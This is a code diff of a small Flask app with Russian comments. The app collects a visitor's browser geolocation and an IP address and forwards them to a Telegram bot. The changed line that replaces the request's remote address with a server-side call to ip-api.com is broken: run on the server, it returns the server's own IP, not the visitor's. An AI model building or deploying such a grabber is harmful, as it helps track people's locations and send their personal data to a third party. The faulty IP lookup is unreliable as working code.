@@ -15,11 +15,12 @@ def send_telegram_message(message):
 
 @app.route('/')
 def index():
-  return render_template('index.html') # Отображаем HTML для получения геопозиции
+  return render_template('index.html')
 
 @app.route('/send_data', methods=['POST'])
 def send_data():
-  user_ip = request.remote_addr # Получаем IP пользователя
+  # Получение IP-адреса с помощью API (например, ip-api.com)
+  user_ip = requests.get('https://ip-api.com/json').json().get('query', 'Неизвестно')
 
   # Информация с клиента (широта и долгота через JS)
   client_data = request.json
@@ -37,6 +38,3 @@ def send_data():
   send_telegram_message(message)
 
   return "Данные отправлены боту!", 200
-
-if __name__ == "__main__":
-  app.run(debug=True, host='0.0.0.0')
